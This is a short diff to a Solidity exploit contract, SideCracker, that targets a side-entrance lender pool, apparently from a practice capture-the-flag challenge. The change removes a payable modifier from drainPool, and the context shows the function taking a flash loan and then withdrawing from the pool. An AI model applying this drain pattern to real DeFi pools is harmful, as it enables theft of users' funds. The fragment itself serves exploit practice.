@@ -16,10 +16,10 @@ contract SideCracker {
         pool = ISideEntranceLenderPool(_poolAddress);
         attacker = msg.sender;
     }
-    
+
     receive() external payable {}
 
-    function drainPool() public payable {
+    function drainPool() public {
         callFlashLoan();
 
         pool.withdraw();
